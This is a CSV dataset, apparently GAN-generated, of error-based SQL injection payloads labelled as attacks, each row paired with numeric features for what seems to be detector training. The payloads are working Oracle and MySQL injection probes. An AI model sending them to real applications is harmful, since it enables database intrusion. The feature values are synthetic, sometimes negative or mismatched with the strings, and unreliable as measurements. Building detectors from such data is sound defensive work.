id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000118,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,4.951548944792548,283.18280029296875,71.13768768310547,40.967594146728516,108.61390686035156,0.898897111415863,86.87550354003906,48.26162338256836,0.9868482351303101,0.2604020833969116,0.15810322761535645,0.4015786647796631,0.1358342170715332,3.6782352924346924,1.0579816102981567,1.3482517004013062,0.672711968421936,0.08094526827335358,0.03556480258703232,0.08460196852684021,11.246023178100586,10.438671112060547,2.705962657928467,-0.01216808706521988,1.9153836965560913,0.15273241698741913,0.010896999388933182,0.0785122737288475,0.005260269623249769,0.6834554672241211,-0.07690877467393875,-0.2135487198829651,1.5549020767211914,0.13976582884788513,0.3409457206726074,2.227602481842041,8.713912010192871,0.7998589277267456,1.852912187576294,0.21722368896007538,0.4037316143512726,1.0484650135040283,0.03645944222807884,0.03361358121037483,0.27085962891578674,-0.04597805440425873,-0.1785106211900711,0.5495930314064026,0.4726906418800354,0.5945460796356201,0.2457112818956375,0.4163416922092438,-0.14735977351665497,0.06825494021177292,0.22442492842674255,-0.009833217598497868,0.016302146017551422,-0.1284506469964981,0.057447969913482666,0.3187474012374878,-0.08044426888227463,0.18969574570655823,-0.09522794932126999,-0.023654000833630562,0.21037574112415314,-0.018774669617414474,0.41376787424087524,0.22380152344703674,0.16739295423030853,-0.10776086896657944,-0.09853681921958923,-0.05241469666361809,0.11943468451499939,0.13345550000667572,0.019078785553574562,-0.05480422079563141,1.1921498775482178,0.2789621651172638,-0.1700548380613327,0.026241635903716087,0.19544298946857452,8.121209144592285,0.910494327545166,0.22169028222560883,-0.016115952283143997,0.604335606098175,-0.00597849115729332,0.19976085424423218,0.11955249309539795
GAN_000119,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,5.098686088342892,292.0243225097656,67.16886138916016,42.78455352783203,108.65934753417969,-2.9301319122314453,84.56884002685547,50.684444427490234,1.1850707530975342,0.25148457288742065,0.17209036648273468,0.40460193157196045,0.14115016162395477,3.62565016746521,1.4706186056137085,1.2809386253356934,0.8043206334114075,0.22213564813137054,0.03070872649550438,0.4067228138446808,11.210503578186035,10.046224594116211,2.8686931133270264,-0.18191751837730408,1.9222605228424072,0.17305882275104523,-0.20010551810264587,0.09020718187093735,0.06004009768366814,0.7295340299606323,-0.009216517210006714,-0.3463515639305115,1.7303833961486816,0.368636816740036,0.2893412709236145,2.2753593921661377,8.482328414916992,0.6316200494766235,2.009366035461426,0.26423922181129456,0.38097673654556274,0.9158452749252319,0.10173199325799942,0.022128822281956673,0.2594693899154663,0.04043543338775635,-0.11371991038322449,0.5522591471672058,0.424163818359375,0.5732601881027222,0.23942968249320984,0.47051745653152466,-0.0734991729259491,-0.15951216220855713,0.14259164035320282,0.014741885475814342,0.02337663248181343,0.23334264755249023,-0.020445875823497772,0.07089846581220627,-0.15355506539344788,0.2308650016784668,-0.015135027468204498,0.21529749035835266,0.19354663789272308,-0.017978571355342865,0.528071939945221,0.2585717439651489,0.17091763019561768,-0.04286725074052811,-0.0661676824092865,-0.16130724549293518,0.035509735345840454,0.24215251207351685,0.022316863760352135,0.2082524299621582,1.231656789779663,0.2632986009120941,-0.2850741744041443,0.052526380866765976,0.23264247179031372,8.563570022583008,0.8978727459907532,0.23773227632045746,-0.05175698176026344,0.5885816812515259,-0.13101354241371155,0.24285860359668732,-0.2090090811252594
GAN_000120,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,5.291966273512814,288.65460205078125,74.19625854492188,38.497711181640625,101.10115051269531,0.7550839781761169,83.03331756591797,50.67082977294922,1.1361995935440063,0.2611731290817261,0.15846191346645355,0.4088476002216339,0.13504798710346222,3.629854679107666,0.9766387939453125,1.2295511960983276,0.6257096529006958,0.11452522873878479,0.018946096301078796,0.1042885035276413,12.40118408203125,9.225353240966797,2.287637233734131,0.07686704397201538,1.8696708679199219,0.1830502450466156,0.2599734663963318,0.05619985982775688,-0.05741081014275551,0.5588302612304688,-0.1369074285030365,-0.07468447834253311,1.3995496034622192,0.09545747935771942,0.3646397292613983,2.21392560005188,8.723176956176758,0.8401122689247131,2.304722547531128,0.31662794947624207,0.5003891587257385,1.09537935256958,0.04065564274787903,0.017677754163742065,0.3476897180080414,-0.19266393780708313,-0.2558821439743042,0.5370194911956787,0.3442423343658447,0.5687761902809143,0.20545706152915955,0.4426014721393585,-0.20788002014160156,0.27169176936149597,0.284873366355896,-0.07384054362773895,0.004743915516883135,-0.17664560675621033,0.219776451587677,0.41348904371261597,-0.169374018907547,0.001642070710659027,-0.349905401468277,0.039164766669273376,0.3433990478515625,0.12047448754310608,0.5145422220230103,0.377046138048172,0.032399214804172516,-0.3272412121295929,0.01503797248005867,-0.25446295738220215,0.0038404464721679688,0.0070791095495224,0.02275106869637966,-0.02118328958749771,1.067517876625061,0.23250408470630646,-0.22472772002220154,-0.011251301504671574,0.21139441430568695,8.101669311523438,0.9303305149078369,0.20780213177204132,-0.023818735033273697,0.6768011450767517,-0.004245564341545105,0.036920856684446335,-0.0209098681807518
GAN_000121,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,5.241730548150563,279.849853515625,72.85847473144531,40.41487503051758,103.16637420654297,2.0968120098114014,87.68729400634766,49.438602447509766,1.160141110420227,0.2539699375629425,0.158894881606102,0.4060090482234955,0.1286206990480423,3.6351492404937744,0.6958680152893066,1.3244640827178955,0.6976705193519592,0.05644170939922333,0.01903514936566353,0.07346327602863312,12.320277214050293,10.309985160827637,2.2461631298065186,0.06821225583553314,1.889596700668335,0.1986854523420334,0.18012972176074982,0.15636394917964935,0.07426633685827255,0.498971164226532,-0.03599109500646591,-0.0205039381980896,1.5025215148925781,0.17569205164909363,0.35718345642089844,2.22800612449646,8.152161598205566,0.8633614182472229,1.9016807079315186,0.11761127412319183,0.5541108846664429,1.0910440683364868,0.011727213859558105,0.017676301300525665,0.30620378255844116,-0.31338536739349365,-0.13946464657783508,0.5967260599136353,0.47931498289108276,0.608340859413147,0.24751152098178864,0.38469961285591125,-0.3436915874481201,0.19906815886497498,0.2700178623199463,-0.019270850345492363,0.01788363605737686,-0.028426922857761383,0.20011287927627563,0.42584577202796936,-0.05162246152758598,0.40300872921943665,-0.13926613330841064,-0.10124938935041428,0.3497917950153351,0.2695378363132477,0.4844833016395569,0.2908658981323242,0.046499814838171005,-0.4074929654598236,-0.25569871068000793,-0.4500580132007599,-0.07387915253639221,-0.14441423118114471,0.012955798767507076,-0.009512379765510559,1.1557445526123047,0.21082445979118347,-0.23148107528686523,-0.04133688658475876,0.11470808833837509,7.170317649841309,0.899029016494751,0.24108755588531494,-0.05842701718211174,0.5872511863708496,-0.14835472404956818,-0.1867465078830719,0.14686331152915955
GAN_000122,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000069,5.120563297550589,286.0793151855469,70.99967193603516,39.44553756713867,107.18225860595703,2.026712656021118,85.32659149169922,50.76566696166992,1.1803361177444458,0.25806257128715515,0.16334953904151917,0.4012412130832672,0.13794755935668945,3.6519577503204346,1.1679614782333374,1.0607764720916748,0.5316900014877319,0.1333506852388382,-0.003748857881873846,0.2353835254907608,11.819589614868164,9.55488395690918,2.6235945224761963,-0.00030536949634552,1.992099404335022,0.16575872898101807,0.05013459920883179,0.09803649038076401,-0.0713491290807724,0.7075114250183105,-0.10704132169485092,-0.192966490983963,1.6337623596191406,0.22377578914165497,0.35570842027664185,2.2127602100372314,8.268303871154785,0.6099401116371155,2.0966084003448486,0.27639129757881165,0.4982442259788513,1.1132709980010986,0.11724476516246796,0.011604010127484798,0.30157962441444397,-0.03119860589504242,-0.265682578086853,0.49218329787254333,0.4007513225078583,0.5554512143135071,0.16670285165309906,0.45630860328674316,-0.13558293879032135,0.05375467985868454,0.28210049867630005,-0.05067075416445732,-0.010130029171705246,-0.2713227868080139,0.24762266874313354,0.3094536066055298,-0.17826169729232788,0.212429016828537,-0.06575710326433182,0.014776434749364853,0.21100978553295135,0.06707361340522766,0.4788619875907898,0.2868000268936157,0.14207085967063904,-0.274122416973114,-0.08571609854698181,-0.17438636720180511,0.06535712629556656,0.152588352560997,0.012851829640567303,0.03224577754735947,1.144906997680664,0.26164549589157104,-0.4520760476589203,-0.02238796092569828,0.23008011281490326,8.586444854736328,0.9440434575080872,0.24574467539787292,-0.023059237748384476,0.5359839200973511,-0.23210954666137695,0.24715881049633026,0.09271417558193207
GAN_000123,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,5.350016915825019,284.0843200683594,75.54918670654297,42.44771194458008,107.7677993774414,-1.3393769264221191,81.99085235595703,53.74306106567383,1.3818650245666504,0.2394905388355255,0.16552004218101501,0.40564486384391785,0.13666346669197083,3.618915319442749,1.5526939630508423,1.5372933149337769,0.908650815486908,0.21263158321380615,0.02841317467391491,0.2704039216041565,12.272464752197266,9.912389755249023,3.132012367248535,-0.15542322397232056,1.7884150743484497,0.16191360354423523,0.09270338714122772,0.01914021000266075,0.010461262427270412,0.7957432866096497,-0.09376315027475357,-0.24770686030387878,1.7431762218475342,0.5930184125900269,0.359206885099411,2.2656214237213135,7.748459815979004,0.5239465236663818,2.0046026706695557,0.2216944396495819,0.5264645218849182,1.0647355318069458,0.19146370887756348,0.004508655052632093,0.2875613868236542,-0.06084282696247101,-0.21969066560268402,0.575752854347229,0.46969157457351685,0.6445578336715698,0.09087033569812775,0.4996562898159027,-0.1167253851890564,0.002170860767364502,0.18365070223808289,-0.014960900880396366,0.05804123356938362,-0.03476502746343613,0.126224547624588,0.19494163990020752,-0.26267972588539124,0.3309560716152191,-0.015582002699375153,0.07370208203792572,0.21052007377147675,-0.04212455078959465,0.5223134756088257,0.18700644373893738,0.2720949947834015,-0.1524777114391327,-0.15282419323921204,-0.28011757135391235,0.002889111638069153,0.21610939502716064,0.023413745686411858,0.12856879830360413,1.2482515573501587,0.2041485458612442,-0.4217274487018585,-0.04951734095811844,0.14078591763973236,8.09754753112793,0.9717424511909485,0.25341957807540894,-0.09060609340667725,0.6269919276237488,-0.08141645044088364,0.33371981978416443,0.044397443532943726
GAN_000124,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000069,4.873008380823117,285.44818115234375,73.75369262695312,42.21054458618164,112.8253173828125,3.055826425552368,80.31275939941406,45.67965316772461,1.0666756629943848,0.26769718527793884,0.16125613451004028,0.4058416187763214,0.13533851504325867,3.638603925704956,0.911595344543457,1.4147690534591675,0.8142058253288269,0.12169225513935089,0.056224219501018524,0.08495044708251953,9.92745590209961,11.136474609375,2.857893228530884,0.1261046975851059,1.939378261566162,0.13981083035469055,0.011895442381501198,0.1588013470172882,0.039982303977012634,0.5984893441200256,-0.09253481775522232,0.0404442697763443,1.62129807472229,0.10308434069156647,0.3755134344100952,2.2067573070526123,8.996111869812012,0.9255937933921814,1.8993507623672485,0.1260424703359604,0.3217029273509979,1.0004507303237915,-0.0919046625494957,0.028289256617426872,0.12927938997745514,-0.08405758440494537,-0.2050742506980896,0.4771503210067749,0.47058984637260437,0.47515466809272766,0.20509494841098785,0.37482771277427673,-0.1553373634815216,0.25146159529685974,0.21044287085533142,0.01393959578126669,0.0672278106212616,0.1411360800266266,0.09919801354408264,0.04392314702272415,0.036017537117004395,-0.06169581413269043,-0.1685405671596527,-0.03454870730638504,0.2275644987821579,-0.1109139695763588,0.5622261166572571,0.09284839779138565,0.18005888164043427,0.068190798163414,-0.04837849736213684,-0.13082684576511383,-0.10312727093696594,0.17875699698925018,0.01680501364171505,0.04848874360322952,1.3659374713897705,0.371778666973114,-0.019389137625694275,0.015217936597764492,0.19706685841083527,8.418304443359375,0.7847250699996948,0.1783936321735382,-0.006229989696294069,0.5487722754478455,-0.02998899295926094,0.05631640926003456,-0.13543260097503662
GAN_000125,attack,error,"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""oyfk""  =  ""oyfk",nearest_attack_euclidean,R000239,5.094735944095775,284.5589599609375,76.59625244140625,41.864253997802734,101.12295532226562,0.28539758920669556,79.7645034790039,49.14659881591797,1.1975756883621216,0.27207621932029724,0.16243022680282593,0.412958025932312,0.13255776464939117,3.6126370429992676,0.9694144129753113,1.3987795114517212,0.8019068241119385,0.09647753089666367,0.041326701641082764,0.17291021347045898,12.166302680969238,10.463443756103516,3.139211654663086,0.10977572947740555,1.9292638301849365,0.13817504048347473,0.1983361542224884,0.16898930072784424,0.03662942722439766,0.5339077711105347,-0.19627457857131958,-0.029349446296691895,1.534883975982666,0.18546296656131744,0.3942490518093109,2.386164665222168,8.477452278137207,0.9292925596237183,2.2636399269104004,0.18270522356033325,0.47740721702575684,0.9536740779876709,-0.09142545610666275,0.018237709999084473,0.20250797271728516,-0.12212933599948883,-0.2672341465950012,0.5890071392059326,0.4873899817466736,0.5285264849662781,0.1895253211259842,0.3388703167438507,-0.37791258096694946,0.16240257024765015,0.24260850250720978,-0.018132006749510765,0.052401307970285416,0.09941910207271576,0.14740151166915894,0.3212931454181671,0.01292460411787033,0.12835624814033508,-0.25818488001823425,0.01339680328965187,0.2958405017852783,0.08000373840332031,0.626315176486969,0.04220101982355118,0.07014162838459015,-0.14967238903045654,0.06861816346645355,-0.32439690828323364,0.003497738391160965,-0.08067859709262848,0.02338077686727047,-0.05821479856967926,1.252831220626831,0.4004164934158325,-0.08636447787284851,0.007366008125245571,0.13212263584136963,7.455124378204346,0.8682262301445007,0.22248639166355133,-0.027311164885759354,0.6063253879547119,-0.11906446516513824,-0.15273360908031464,-0.009169600903987885
GAN_000126,attack,error,"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'cuat'  =  'cuat",nearest_attack_euclidean,R000301,5.021586602030566,279.67950439453125,74.18659210205078,41.26308059692383,109.44439697265625,-0.041520070284605026,80.78031158447266,47.3918571472168,0.9801574945449829,0.25984299182891846,0.169869527220726,0.41050028800964355,0.1328452080488205,3.669137716293335,1.086847186088562,1.2983189821243286,0.8103484511375427,0.13431710004806519,0.08500499278306961,0.21942564845085144,10.68509292602539,11.009933471679688,3.0578808784484863,-0.06926701217889786,1.80271577835083,0.18028372526168823,-0.019412782043218613,0.0567442886531353,0.07745815068483353,0.6384446024894714,-0.024839945137500763,-0.1830592155456543,1.5799918174743652,0.10529732704162598,0.3850826919078827,2.1773948669433594,8.909501075744629,1.0807294845581055,1.9434236288070679,0.14764629304409027,0.33473336696624756,0.9095160961151123,-0.08663647621870041,0.03592711314558983,-0.00025425106287002563,-0.19146955013275146,-0.050423189997673035,0.5550733208656311,0.5568819046020508,0.5527873635292053,0.20622411370277405,0.2875482738018036,-0.02950529009103775,0.11401722580194473,0.17356286942958832,0.03310281038284302,0.059975218027830124,0.13655388355255127,-0.034810036420822144,0.19520628452301025,-0.014646723866462708,-0.09949265420436859,-0.12542036175727844,0.07604001462459564,0.20273928344249725,-0.1806517094373703,0.45914939045906067,0.0777067169547081,0.14606210589408875,0.06645360589027405,0.02517511323094368,-0.17575165629386902,0.0539882630109787,0.12643717229366302,0.01932828687131405,-0.20687136054039001,1.4245851039886475,0.40491071343421936,-0.17270609736442566,0.005283056758344173,0.18467935919761658,7.672613620758057,0.8799636363983154,0.21393749117851257,0.01706181839108467,0.6324736475944519,0.21239545941352844,-0.061766013503074646,-0.032532691955566406
GAN_000127,attack,error,"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",nearest_attack_euclidean,R000069,5.01393678404819,274.1591491699219,70.37747955322266,40.568809509277344,107.57006072998047,-0.37553828954696655,80.833251953125,48.926841735839844,0.9142611622810364,0.25862205028533936,0.17572081089019775,0.4065416753292084,0.13383683562278748,3.6812422275543213,0.9257643818855286,1.2246990203857422,0.677436351776123,0.16192835569381714,0.07354079186916351,0.279136061668396,10.714699745178223,10.566407203674316,2.8991549015045166,-0.08333270996809006,1.8126856088638306,0.22257034480571747,-0.1396860033273697,0.022462960332632065,0.11647233366966248,0.685238778591156,-0.0007193088531494141,-0.33070042729377747,1.655266523361206,0.07496154308319092,0.32835572957992554,2.1954574584960938,9.159777641296387,0.9660511016845703,2.039311170578003,0.06906375288963318,0.3695858120918274,0.8936488628387451,0.002313576638698578,0.04021289944648743,0.12997755408287048,-0.29244452714920044,0.10010300576686859,0.5288066864013672,0.5486046075820923,0.5947139263153076,0.2457166165113449,0.2611006200313568,0.06470554322004318,0.023733288049697876,0.16353178024291992,0.03370538726449013,0.051299359649419785,0.08339283615350723,-0.07419148087501526,0.19178476929664612,-0.1018393412232399,-0.1370435208082199,-0.07638510316610336,0.13823401927947998,0.20825500786304474,0.02597673609852791,0.4306587874889374,0.2468319535255432,0.17148837447166443,0.08339562267065048,-0.17928460240364075,-0.24658165872097015,0.08895976096391678,0.06029713153839111,0.018794838339090347,-0.12769591808319092,1.437972903251648,0.34790804982185364,-0.24578100442886353,0.06614797562360764,0.26996439695358276,7.803192138671875,0.919535219669342,0.1980331391096115,0.016178801655769348,0.6354915499687195,0.18222138285636902,-0.04008324071764946,-0.015881545841693878
GAN_000128,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""ftjg""  =  ""ftjg",nearest_attack_euclidean,R000048,5.047632677024573,284.33758544921875,72.57621765136719,40.74448013305664,102.36856079101562,-0.416789710521698,84.45449829101562,49.79476547241211,1.0248029232025146,0.2481253296136856,0.1645459532737732,0.4117087423801422,0.1298651099205017,3.65053391456604,0.8431661128997803,1.6682285070419312,0.8408803343772888,0.12630218267440796,0.062288448214530945,-0.025368817150592804,11.113255500793457,10.98727798461914,2.1910266876220703,-0.0021011754870414734,1.8498821258544922,0.17123033106327057,0.027113642543554306,-0.004555945284664631,0.11608577519655228,0.5817450881004333,-0.02582923322916031,-0.07322795689105988,1.671303391456604,0.08078429847955704,0.3615354895591736,2.154146194458008,8.875021934509277,1.080011010169983,1.996459722518921,0.17081081867218018,0.3746497929096222,0.9046991467475891,0.036412563174963,0.05449661612510681,0.16971981525421143,-0.3000572919845581,0.05503758788108826,0.5385545492172241,0.5058552026748657,0.5812097191810608,0.21171247959136963,0.3136861324310303,-0.09204837679862976,0.16042649745941162,0.14678320288658142,0.02379690483212471,0.07175268977880478,0.17712970077991486,-0.06675077974796295,0.2643034756183624,-0.011835195124149323,-0.07894498109817505,-0.17126896977424622,0.04279524087905884,0.30060523748397827,-0.08922280371189117,0.5724883675575256,0.10807419568300247,0.06652271002531052,-0.03889327496290207,-0.04606319218873978,-0.24043361842632294,0.0388948991894722,0.12239141762256622,0.017966363579034805,-0.0063664838671684265,1.3548458814620972,0.3284917175769806,-0.14128202199935913,0.0593702532351017,0.20745426416397095,7.59288215637207,0.8535532355308533,0.17184863984584808,-0.004877649713307619,0.6887096762657166,0.27996596693992615,-0.17368517816066742,0.024680480360984802
GAN_000129,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000168,4.989321630328342,288.2538757324219,64.60211944580078,43.138607025146484,110.44001770019531,-1.9386491775512695,85.45897674560547,49.46841812133789,1.1316747665405273,0.24954837560653687,0.16654393076896667,0.41094717383384705,0.13906730711460114,3.6240148544311523,1.2551497220993042,1.4552668333053589,0.7536461353302002,0.2315894067287445,0.059159304946660995,0.19935739040374756,11.164201736450195,10.672150611877441,2.4655673503875732,-0.10291554778814316,1.8817042112350464,0.23523615300655365,-0.11262598633766174,0.007605577819049358,0.08049408346414566,0.7899821400642395,0.0047881342470645905,-0.2775425910949707,1.509665608406067,0.3002038300037384,0.2623734772205353,2.3429267406463623,9.228680610656738,0.6804731488227844,1.834648609161377,0.1068989634513855,0.3932039737701416,0.9715888500213623,0.023355919867753983,0.01890135183930397,0.35236766934394836,-0.19573205709457397,-0.14230214059352875,0.5863484740257263,0.49890196323394775,0.6185125708580017,0.1934020072221756,0.3793419599533081,-0.07284882664680481,0.11456660181283951,0.16019359230995178,0.02665531262755394,0.039533987641334534,0.21991181373596191,-0.08263815194368362,0.06657570600509644,-0.027609966695308685,0.15975680947303772,-0.10949789732694626,0.05354087054729462,0.21076396107673645,-0.02763867750763893,0.4377835690975189,0.28877535462379456,0.18427224457263947,0.005563393235206604,-0.2281005084514618,-0.15977880358695984,-0.030650444328784943,0.31428390741348267,0.027016587555408478,0.07355721294879913,1.3626935482025146,0.22150465846061707,-0.3009837567806244,0.03475085645914078,0.20486533641815186,8.425690650939941,0.9155545234680176,0.22741997241973877,-0.05952243134379387,0.5672048330307007,0.03207029402256012,0.280629426240921,-0.1337011754512787
GAN_000130,attack,error,"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""oyfk""  =  ""oyfk",nearest_attack_euclidean,R000239,4.900492523081126,281.6949768066406,73.57071685791016,40.82926940917969,113.63932800292969,-1.0443239212036133,79.14694213867188,47.9313850402832,1.0449618101119995,0.2711721658706665,0.16589950025081635,0.4087459146976471,0.13482122123241425,3.628520965576172,1.1569571495056152,1.538861870765686,0.8801511526107788,0.1525615155696869,0.06083546206355095,0.31269580125808716,10.564682006835938,10.647104263305664,3.0118584632873535,0.04559760168194771,1.8864622116088867,0.16879598796367645,0.010613556951284409,0.07736771553754807,0.10527101159095764,0.653630793094635,-0.08054835349321365,-0.14751838147640228,1.7777928113937378,0.21551652252674103,0.35519513487815857,2.111207962036133,8.388667106628418,1.0119975805282593,2.0348832607269287,0.1986527442932129,0.31863918900489807,0.881112277507782,0.007639996707439423,0.07289616763591766,0.12168818712234497,-0.2818906605243683,-0.06854616850614548,0.5638350248336792,0.46137645840644836,0.525585949420929,0.23281244933605194,0.3454754650592804,-0.09871387481689453,0.043729268014431,0.12865693867206573,0.024360384792089462,0.07904058694839478,0.09136701375246048,-0.017907291650772095,0.18110328912734985,-0.054922159761190414,-0.06442958861589432,-0.11503545194864273,0.07399766147136688,0.2245330661535263,-0.11025132983922958,0.5387587547302246,0.1391395628452301,0.12963348627090454,0.1292753964662552,0.0020605698227882385,-0.29439476132392883,-0.034851305186748505,0.14223596453666687,0.020230479538440704,-0.01634618639945984,1.347983479499817,0.3657566010951996,-0.19483181834220886,0.04412296414375305,0.15684619545936584,7.7818169593811035,0.8256152272224426,0.17328739166259766,-0.028209734708070755,0.6282282471656799,0.0338471457362175,-0.08406121283769608,-0.14703452587127686
